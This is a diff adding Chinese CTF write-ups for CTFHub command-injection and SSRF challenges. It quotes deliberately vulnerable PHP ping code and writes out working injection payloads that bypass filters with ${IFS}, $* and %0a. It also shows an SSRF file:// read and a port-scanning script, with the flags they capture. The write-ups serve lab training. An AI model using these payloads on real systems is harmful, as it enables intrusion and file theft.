@@ -2650,3 +2650,438 @@ string(33) "ctfhub{b35e66b450a1a4de4e4d3365}
 提交`ctfhub{b35e66b450a1a4de4e4d3365}`即可。
 
 ------
+
+### 命令注入
+
+**常见的拼接符**
+
+```python
+A ; B     # 先执行A再执行B
+A & B     # 简单的拼接
+A | B     # 只显示B的执行结果
+A && B    # A执行成功后才会执行B
+A || B    # A执行失败后才会执行B
+${IFS}    # 在特殊情况下可代替空格
+$*        # 在shell中可执行为空
+%0a       # 换行符
+%0d       # 回车符
+```
+
+题目描述如下：
+
+> 这是一个在线测试网络延迟的平台，路由器中经常会见到。无任何安全措施，尝试获取 flag
+
+这是一个无过滤的命令注入题。`PHP`的关键代码如下：
+
+```php
+<?php
+$res = FALSE;
+if (isset($_GET['ip']) && $_GET['ip']) {
+    $cmd = "ping -c 4 {$_GET['ip']}";
+    exec($cmd, $res);
+}
+?>
+```
+
+我们输入`127.0.0.1 | ls`或`; ls`，相当于执行`ping -c 4 127.0.0.1 | ls`或`ping -c 4 ; ls`，后者会报错`ping: missing host operand`但shell仍会继续执行 `ls`。我们可以看到以下回显内容：
+
+```php
+Array
+(
+    [0] => 4527152612357.php
+    [1] => index.php
+)
+```
+
+直接`127.0.0.1 | cat 4527152612357.php`，右键查看网页源码可以看到回显内容：
+
+```php
+Array
+(
+    [0] => <?php // ctfhub{a0a9dc69f8f3b21cc6a06754}
+)
+```
+
+提交`flag`即可。
+
+------
+
+### 过滤cat
+
+> 过滤了cat命令之后，你还有什么方法能读到 Flag?
+
+靶机给出的`PHP`代码如下：
+
+```php
+<?php
+$res = FALSE;
+if (isset($_GET['ip']) && $_GET['ip']) {
+    $ip = $_GET['ip'];
+    $m = [];
+    if (!preg_match_all("/cat/", $ip, $m)) {
+        $cmd = "ping -c 4 {$ip}";
+        exec($cmd, $res);
+    } else {
+        $res = $m;
+    }
+}
+?>
+```
+
+我们可以看到`cat`命令被过滤啦，只能用类似它的命令输出内容啦。比如`tail`、`head`、`less`、`more`。
+
+输入`127.0.0.1 | ls`可以看到以下回显内容：
+
+```php
+Array
+(
+    [0] => flag_28972198054974.php
+    [1] => index.php
+)
+```
+
+输入`127.0.0.1 | tail flag_28972198054974.php`，右键查看网页源码可以看到`flag`。
+
+```php
+Array
+(
+    [0] => <?php // ctfhub{37a5bd98095932d0e71c208d}
+)
+```
+
+提交`flag`即可。
+
+------
+
+### 过滤空格
+
+> 这次过滤了空格，你能绕过吗
+
+靶机给出的`PHP`代码如下：
+
+```php
+<?php
+$res = FALSE;
+if (isset($_GET['ip']) && $_GET['ip']) {
+    $ip = $_GET['ip'];
+    $m = [];
+    if (!preg_match_all("/ /", $ip, $m)) {
+        $cmd = "ping -c 4 {$ip}";
+        exec($cmd, $res);
+    } else {
+        $res = $m;
+    }
+}
+?>
+```
+
+空格被过滤掉啦。在Shell（尤其是Bash）中，我们通常可以使用`${IFS}`代替空格。
+
+输入`;${IFS}ls`，可以看到回显内容如下：
+
+```php
+Array
+(
+    [0] => flag_13475112644701.php
+    [1] => index.php
+)
+```
+
+输入`;cat${IFS}flag_13475112644701.php`，右键查看网页源码可以看到以下内容：
+
+```php
+Array
+(
+    [0] => <?php // ctfhub{443b0571edd4f358f0273e3e}
+)
+```
+
+提交`flag`即可。
+
+------
+
+### 过滤目录分隔符
+
+> 这次过滤了目录分割符 / ，你能读到 flag 目录下的 flag 文件吗
+
+靶机给出的`PHP`代码如下：
+
+```php
+<?php
+$res = FALSE;
+if (isset($_GET['ip']) && $_GET['ip']) {
+    $ip = $_GET['ip'];
+    $m = [];
+    if (!preg_match_all("/\//", $ip, $m)) {
+        $cmd = "ping -c 4 {$ip}";
+        exec($cmd, $res);
+    } else {
+        $res = $m;
+    }
+}
+?>
+```
+
+输入`; ls`，可以看到以下回显内容：
+
+```php
+Array
+(
+    [0] => flag_is_here
+    [1] => index.php
+)
+```
+
+输入`; cd flag_is_here; ls`，可以看到以下回显内容：
+
+```php
+Array
+(
+    [0] => flag_91642870531208.php
+)
+```
+
+输入`; cd flag_is_here; cat flag_91642870531208.php`，右键查看网页源码能看到以下内容：
+
+```php
+Array
+(
+    [0] => <?php // ctfhub{927787c835e0ee9b0908bada}
+)
+```
+
+提交`flag`即可。
+
+------
+
+### 过滤运算符
+
+> 过滤了几个运算符, 要怎么绕过呢
+
+靶机给出的`PHP`代码如下：
+
+```php
+<?php
+$res = FALSE;
+if (isset($_GET['ip']) && $_GET['ip']) {
+    $ip = $_GET['ip'];
+    $m = [];
+    if (!preg_match_all("/(\||\&)/", $ip, $m)) {
+        $cmd = "ping -c 4 {$ip}";
+        exec($cmd, $res);
+    } else {
+        $res = $m;
+    }
+}
+?>
+```
+
+这道题明确过滤了任何包含 `|` 或 `&` 的输入（包括 `||`、`&&`、`|`、`&`），我们仍可以想办法绕过。
+
+输入`; ls`，可以看到以下回显内容：
+
+```php
+Array
+(
+    [0] => flag_17418260026643.php
+    [1] => index.php
+)
+```
+
+输入`; cat flag_17418260026643.php`，右键查看网页源码可以看到以下内容：
+
+```php
+Array
+(
+    [0] => <?php // ctfhub{231a3344ae126d0c8c9312f1}
+)
+```
+
+提交`flag`即可。
+
+------
+
+### 综合过滤练习
+
+> 同时过滤了前面几个小节的内容, 如何打出漂亮的组合拳呢?
+
+靶机给出的`PHP`代码如下：
+
+```php
+<?php
+$res = FALSE;
+if (isset($_GET['ip']) && $_GET['ip']) {
+    $ip = $_GET['ip'];
+    $m = [];
+    if (!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)) {
+        $cmd = "ping -c 4 {$ip}";
+        exec($cmd, $res);
+    } else {
+        $res = $m;
+    }
+}
+?>
+```
+
+这意味着只要输入中包含以下**任意一个**内容，就会被拦截：`|`，`&`，`;`，空格，`/`，字符串 `cat`，字符串 `flag`，字符串 `ctfhub`。我们需要想办法绕过去。
+
+`%0a`相当于换行符，`%0d`相当于回车，`${IFS}`可代替空格，`$*`可表示为空。
+
+为了避免被再次`URL`解析，我们可以直接构造`GET`请求`/?ip=127.0.0.1%0als`。
+
+```php
+Array
+(
+    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
+    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.030 ms
+    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.041 ms
+    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.052 ms
+    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.042 ms
+    [5] => 
+    [6] => --- 127.0.0.1 ping statistics ---
+    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
+    [8] => round-trip min/avg/max = 0.030/0.041/0.052 ms
+    [9] => flag_is_here
+    [10] => index.php
+)
+```
+
+由于`flag`字符串被过滤了，所以需要用`/?ip=127.0.0.1%0acd${IFS}fl$*ag_is_here%0als`绕过去。
+
+```php
+Array
+(
+    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
+    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.032 ms
+    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.051 ms
+    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.041 ms
+    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.044 ms
+    [5] => 
+    [6] => --- 127.0.0.1 ping statistics ---
+    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
+    [8] => round-trip min/avg/max = 0.032/0.042/0.051 ms
+    [9] => flag_281721768515479.php
+)
+```
+
+`cat`字符串也被过滤了，但我们可以用`tail`、`head`、`less`、`more`等方式读取`flag`文件中的内容。
+
+构造`/?ip=127.0.0.1%0acd${IFS}fl$*ag_is_here%0ahead${IFS}f$*lag_281721768515479.php`，右键查看网页源码，可以看到内容如下：
+
+```php
+Array
+(
+    [0] => PING 127.0.0.1 (127.0.0.1): 56 data bytes
+    [1] => 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.029 ms
+    [2] => 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.044 ms
+    [3] => 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.055 ms
+    [4] => 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.037 ms
+    [5] => 
+    [6] => --- 127.0.0.1 ping statistics ---
+    [7] => 4 packets transmitted, 4 packets received, 0% packet loss
+    [8] => round-trip min/avg/max = 0.029/0.041/0.055 ms
+    [9] => <?php // ctfhub{3e78b7fc46b5185e46457467}
+)
+```
+
+提交`flag`即可。
+
+------
+
+## SSRF
+
+SSRF（Server-Side Request Forgery：服务器端请求伪造）是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）
+
+SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器
+
+简单理解就是可以从某些地方让目标服务器发起请求（url参数上较为常见），我们利用目标服务器的请求权限来请求内网内容来达到攻击的目的。
+
+### 内网访问
+
+> 尝试访问位于127.0.0.1的flag.php吧
+
+进入靶机后，根据提示访问127.0.0.1的flag.php，直接构造`GET`请求`/?url=127.0.0.1/flag.php`。
+
+或者`/?url=http://127.0.0.1/flag.php`也可以看到`ctfhub{6ddbe77332c12fc373efbb47}`。
+
+------
+
+### 伪协议读取文件
+
+> 尝试去读取一下Web目录下的flag.php吧
+
+常见的Web目录为`/var/www/html/`。前面已经介绍过常见的`php`伪协议，这里我们可以用`file://`。
+
+构造`GET`请求`/?url=file:///var/www/html/flag.php`，直接看到？？？，右键查看网页源码内容。
+
+```php+HTML
+<?php
+// Flag is ctfhub{35f22234ba8ccb16a4ef763e}
+?>
+
+???
+```
+
+提交`flag`即可。
+
+------
+
+### 端口扫描
+
+> 来来来性感CTFHub在线扫端口，据说端口范围是8000-9000哦。
+
+首先用`Burp Suite`抓包靶机，然后右键`Send to Intruder`。
+
+```
+GET /?url=127.0.0.1:8000 HTTP/1.1
+Host: challenge-d11d59bf5b106116.sandbox.ctfhub.com:10800
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+```
+
+Target是`http://challenge-d11d59bf5b106116.sandbox.ctfhub.com:10800`。
+
+Positions选中8000后点击Add。
+
+Payloads中的设置是：`Payload type`为`Number`，Number range中的From是`8000`，To是`9000`，Step是`1`。
+
+设置好后点击Start attack，端口扫描完成后可以在结果中看到大多数的请求长度为332，找到一个例外的长度是365，端口号为8480。点击后可以看到`flag`字符串`ctfhub{f25596e0f74ea29fb8b66f1b}`。
+
+此外，我们也可以编写`Python`代码遍历8000-9000来扫描端口。
+
+```python
+import requests
+
+base_url = "http://challenge-d11d59bf5b106116.sandbox.ctfhub.com:10800/?url=127.0.0.1:"
+
+for port in range(8000, 9001):
+    url = f"{base_url}{port}"
+    try:
+        response = requests.get(url, timeout=2)
+        # print(f"Port {port}: Status Code {response.status_code}")
+        content_length = len(response.content)
+        if content_length > 0:
+            print(f"Port {port}: Status Code {response.status_code}")
+            print(f"Response Length: {content_length} bytes")
+            print(response.content.decode('utf-8'))
+    except requests.exceptions.RequestException as e:
+        print(f"Port {port}: Error - {e}")
+```
+
+运行代码后可以看到以下内容：
+
+```
+Port 8480: Status Code 200
+Response Length: 32 bytes
+ctfhub{f25596e0f74ea29fb8b66f1b}
+```
+
+提交`flag`即可。
+
+------
+
